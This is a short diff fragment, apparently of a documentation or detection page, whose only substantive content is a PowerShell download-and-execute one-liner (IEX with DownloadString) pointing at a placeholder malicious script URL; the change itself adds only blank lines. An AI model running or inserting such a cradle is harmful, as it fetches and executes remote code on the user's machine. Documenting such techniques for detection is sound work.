@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:18.324197+00:00'
 ```ps1
 IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
 ```
+
+
